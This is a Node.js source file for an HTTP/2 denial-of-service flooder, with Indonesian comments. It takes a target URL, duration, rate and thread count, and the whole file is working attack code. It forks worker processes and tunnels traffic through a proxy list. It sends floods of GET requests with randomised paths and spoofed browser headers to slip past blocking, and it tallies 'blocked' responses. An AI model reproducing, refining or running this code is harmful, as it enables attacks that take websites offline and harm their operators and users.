const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 5){
    console.log(`Usage: node raw.js <url> <time> <rate> <threads> [--noproxy]`); 
    console.log(`Example: node raw.js https://example.com/ 120 16 4`);
    console.log(`Without proxy: node raw.js https://example.com/ 120 16 4 --noproxy`);
    process.exit();
}

const useProxy = process.argv[6] !== "--noproxy";

// Modern ciphers untuk TLS 1.3
const ciphersTLS12 = [
    "TLS_AES_256_GCM_SHA384",
    "TLS_AES_128_GCM_SHA256",
    "TLS_CHACHA20_POLY1305_SHA256",
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-CHACHA20-POLY1305"
].join(":");

const ecdhCurve = "x25519:secp256r1:secp384r1";

const secureOptions = 
 crypto.constants.SSL_OP_NO_SSLv2 |
 crypto.constants.SSL_OP_NO_SSLv3 |
 crypto.constants.SSL_OP_NO_TLSv1 |
 crypto.constants.SSL_OP_NO_TLSv1_1 |
 crypto.constants.ALPN_ENABLED |
 crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE;

const secureContextOptions = {
    ciphers: ciphersTLS12,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    minVersion: "TLSv1.2",
    maxVersion: "TLSv1.3"
};

const secureContext = tls.createSecureContext(secureContextOptions);

var proxies = [];
if (useProxy) {
    try {
        proxies = fs.readFileSync("proxy.txt", "utf-8").toString().split(/\r?\n/).filter(line => line.trim());
        console.log(`📡 Loaded ${proxies.length} proxies`);
    } catch(e) {
        console.log(`⚠️ No proxy.txt found, using direct connection`);
    }
}

// Extended User Agents dengan variasi lebih banyak
const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
];

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5]
}

const parsedTarget = url.parse(args.target);
const basePath = parsedTarget.path || "/";

let stats = {
    total: 0,
    success: 0,
    blocked: 0,
    error: 0,
    active: 0
};

if (cluster.isMaster) {
    console.log(`🔥 Starting Flood Attack (GET Method Only)`);
    console.log(`🎯 Target: ${args.target}`);
    console.log(`⏱️ Duration: ${args.time} seconds`);
    console.log(`⚡ Rate: ${args.Rate} req/sec per connection`);
    console.log(`🧵 Threads: ${args.threads}`);
    console.log(`🔒 TLS Version: 1.2 & 1.3`);
    console.log(`🌐 Proxy Mode: ${useProxy ? "Enabled" : "Disabled"}`);
    console.log(`====================================`);
    
    const statsInterval = setInterval(() => {
        console.log(`\n📊 STATS UPDATE [${new Date().toLocaleTimeString()}]:`);
        console.log(`   Total: ${stats.total}`);
        console.log(`   ✅ Success: ${stats.success} (${((stats.success/stats.total)*100 || 0).toFixed(2)}%)`);
        console.log(`   🚫 Blocked: ${stats.blocked} (${((stats.blocked/stats.total)*100 || 0).toFixed(2)}%)`);
        console.log(`   ❌ Error: ${stats.error}`);
        console.log(`   🔗 Active: ${stats.active}`);
    }, 3000);
    
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
    
    setTimeout(() => {
        clearInterval(statsInterval);
        console.log(`\n✅ Attack Finished!`);
        console.log(`📊 Final Stats:`);
        console.log(`   Total Requests: ${stats.total}`);
        console.log(`   ✅ Success: ${stats.success} (${((stats.success/stats.total)*100 || 0).toFixed(2)}%)`);
        console.log(`   🚫 Blocked: ${stats.blocked} (${((stats.blocked/stats.total)*100 || 0).toFixed(2)}%)`);
        console.log(`   ❌ Error: ${stats.error}`);
        process.exit(1);
    }, args.time * 1000);
} else {
    console.log(`Worker ${cluster.worker.id} started`);
    
    const intervalsPerWorker = Math.min(200, args.Rate);
    for (let i = 0; i < intervalsPerWorker; i++) {
        setTimeout(() => {
            setInterval(() => {
                if (stats.active < 5000) {
                    runFlooder();
                }
            }, Math.max(1, Math.floor(1000 / (args.Rate / intervalsPerWorker))));
        }, i * 10);
    }
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    if (!elements || elements.length === 0) return "";
    return elements[randomIntn(0, elements.length)];
}

function randomString(length) {
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

function randomIP() {
    return randomIntn(1,255) + "." + randomIntn(1,255) + "." + randomIntn(1,255) + "." + randomIntn(1,255);
}

// Generate random path yang bervariasi dan natural
function generateRandomPath() {
    const pathTypes = [
        // Normal path dengan parameter random
        () => basePath + (basePath.endsWith('/') ? '' : '/') + randomString(randomIntn(3, 12)),
        // Path dengan query parameters
        () => basePath + '?' + randomString(5) + '=' + randomString(randomIntn(3, 8)) + '&' + randomString(4) + '=' + randomString(5),
        // Path dengan angka
        () => basePath + randomIntn(100, 9999) + '/' + randomString(6),
        // Path dengan ekstensi file
        () => basePath + randomString(8) + ['.html', '.php', '.jpg', '.png', '.css', '.js'][randomIntn(0, 6)],
        // Path dengan multiple levels
        () => basePath + randomString(4) + '/' + randomString(6) + '/' + randomString(5),
        // Path kosong (root)
        () => basePath,
        // Path dengan timestamp
        () => basePath + '?t=' + Date.now() + '&r=' + randomString(4)
    ];
    
    return pathTypes[randomIntn(0, pathTypes.length)]();
}

// Generate random headers yang bervariasi
function generateRandomHeaders() {
    const acceptValues = [
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "application/json, text/plain, */*",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
    ];
    
    const acceptLanguages = [
        "en-US,en;q=0.9",
        "id-ID,id;q=0.9,en;q=0.8",
        "en-GB,en;q=0.9",
        "en;q=0.9,id;q=0.8"
    ];
    
    const acceptEncodings = [
        "gzip, deflate, br",
        "gzip, deflate",
        "br, gzip, deflate"
    ];
    
    const secChUa = [
        '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        '"Google Chrome";v="119", "Not?A_Brand";v="8", "Chromium";v="119"',
        '"Microsoft Edge";v="120", "Not?A_Brand";v="8", "Chromium";v="120"'
    ];
    
    return {
        "user-agent": randomElement(userAgents),
        "accept": randomElement(acceptValues),
        "accept-language": randomElement(acceptLanguages),
        "accept-encoding": randomElement(acceptEncodings),
        "cache-control": randomIntn(0, 2) ? "no-cache" : "max-age=0",
        "pragma": randomIntn(0, 2) ? "no-cache" : "",
        "sec-ch-ua": randomElement(secChUa),
        "sec-ch-ua-mobile": randomIntn(0, 2) ? "?0" : "?1",
        "sec-ch-ua-platform": randomIntn(0, 2) ? '"Windows"' : '"macOS"',
        "upgrade-insecure-requests": "1",
        "sec-fetch-site": randomIntn(0, 3) === 0 ? "none" : "same-origin",
        "sec-fetch-mode": "navigate",
        "sec-fetch-user": "?1",
        "sec-fetch-dest": "document"
    };
}

function runFlooder() {
    stats.active++;
    
    const makeRequest = (proxyConn) => {
        const settings = {
            enablePush: false,
            initialWindowSize: 2147483647,
            maxConcurrentStreams: 1000,
            headerTableSize: 4096,
            maxHeaderListSize: 262144
        };

        const tlsOptions = {
            port: 443,
            ALPNProtocols: ["h2", "http/1.1"],
            ciphers: ciphersTLS12,
            requestCert: false,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: true,
            host: parsedTarget.host,
            rejectUnauthorized: false,
            secureOptions: secureOptions,
            secureContext: secureContext,
            servername: parsedTarget.host,
            minVersion: "TLSv1.2",
            maxVersion: "TLSv1.3",
            sessionTimeout: 300000
        };

        if (proxyConn) {
            tlsOptions.socket = proxyConn;
        }

        const tlsConn = proxyConn ? 
            tls.connect(443, parsedTarget.host, tlsOptions) :
            tls.connect(443, parsedTarget.host, tlsOptions);

        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 60000);
        tlsConn.setMaxListeners(0);

        let requestInterval;
        let requestCount = 0;
        
        tlsConn.once("secureConnect", () => {
            const client = http2.connect(parsedTarget.href, {
                protocol: "https:",
                settings: settings,
                createConnection: () => tlsConn,
                maxSessionMemory: 1000,
                maxDeflateDynamicTableSize: 4294967295,
                maxSettings: 4294967295,
                maxFrameSize: 16777215
            });

            client.setMaxListeners(0);
            
            const startTime = Date.now();
            
            requestInterval = setInterval(() => {
                const elapsed = Date.now() - startTime;
                if (elapsed > args.time * 1000) {
                    clearInterval(requestInterval);
                    client.destroy();
                    if (proxyConn) proxyConn.destroy();
                    stats.active--;
                    return;
                }
                
                // Generate random path untuk setiap request
                const randomPath = generateRandomPath();
                const headers = generateRandomHeaders();
                
                // Hanya menggunakan method GET
                const http2Headers = {
                    [":method"]: "GET",
                    [":path"]: randomPath,
                    [":scheme"]: "https",
                    [":authority"]: parsedTarget.host,
                    ...headers
                };
                
                // Hapus header kosong
                Object.keys(http2Headers).forEach(key => {
                    if (!http2Headers[key]) delete http2Headers[key];
                });
                
                try {
                    const request = client.request(http2Headers);
                    
                    let timeout = setTimeout(() => {
                        request.close();
                        request.destroy();
                    }, 5000);
                    
                    request.on("response", (responseHeaders) => {
                        clearTimeout(timeout);
                        const statusCode = responseHeaders[":status"];
                        stats.total++;
                        requestCount++;
                        
                        if (statusCode === 200 || statusCode === 301 || statusCode === 302 || statusCode === 304) {
                            stats.success++;
                        } else if (statusCode === 403 || statusCode === 503 || statusCode === 429 || statusCode === 444) {
                            stats.blocked++;
                        } else {
                            stats.error++;
                        }
                        
                        request.close();
                        request.destroy();
                    });
                    
                    request.on("error", (err) => {
                        clearTimeout(timeout);
                        stats.total++;
                        stats.error++;
                        request.close();
                        request.destroy();
                    });
                    
                    request.end();
                } catch(e) {
                    stats.total++;
                    stats.error++;
                }
            }, Math.max(5, Math.floor(1000 / args.Rate)));
            
            client.requestInterval = requestInterval;
        });

        tlsConn.on("error", (err) => {
            if (requestInterval) clearInterval(requestInterval);
            if (proxyConn) proxyConn.destroy();
            if (stats.active > 0) stats.active--;
        });
        
        if (proxyConn) {
            proxyConn.on("error", () => {
                if (requestInterval) clearInterval(requestInterval);
                tlsConn.destroy();
                if (stats.active > 0) stats.active--;
            });
            
            proxyConn.on("close", () => {
                if (requestInterval) clearInterval(requestInterval);
                if (stats.active > 0) stats.active--;
            });
        }
        
        tlsConn.on("close", () => {
            if (requestInterval) clearInterval(requestInterval);
            if (stats.active > 0) stats.active--;
        });
    };
    
    if (useProxy && proxies.length > 0) {
        const proxyAddr = randomElement(proxies);
        if (proxyAddr) {
            const parsedProxy = proxyAddr.split(":");
            if (parsedProxy.length >= 2) {
                const proxyConn = net.connect({
                    host: parsedProxy[0],
                    port: ~~parsedProxy[1],
                    allowHalfOpen: true
                });
                
                proxyConn.setTimeout(10000);
                proxyConn.setKeepAlive(true, 30000);
                
                const payload = "CONNECT " + parsedTarget.host + ":443 HTTP/1.1\r\n" +
                    "Host: " + parsedTarget.host + "\r\n" +
                    "User-Agent: " + randomElement(userAgents) + "\r\n" +
                    "Proxy-Connection: Keep-Alive\r\n\r\n";
                
                proxyConn.on("connect", () => {
                    proxyConn.write(payload);
                });
                
                proxyConn.on("data", (chunk) => {
                    const response = chunk.toString();
                    if (response.includes("200 Connection established") || 
                        response.includes("HTTP/1.1 200") ||
                        response.includes("HTTP/1.0 200")) {
                        proxyConn.removeAllListeners("data");
                        makeRequest(proxyConn);
                    } else {
                        proxyConn.destroy();
                        if (stats.active > 0) stats.active--;
                    }
                });
                
                proxyConn.on("error", () => {
                    if (stats.active > 0) stats.active--;
                });
                
                proxyConn.on("timeout", () => {
                    proxyConn.destroy();
                    if (stats.active > 0) stats.active--;
                });
                
                return;
            }
        }
    }
    
    makeRequest(null);
}

process.on('uncaughtException', (error) => {
    if (stats.active > 0) stats.active--;
});
process.on('unhandledRejection', (error) => {});
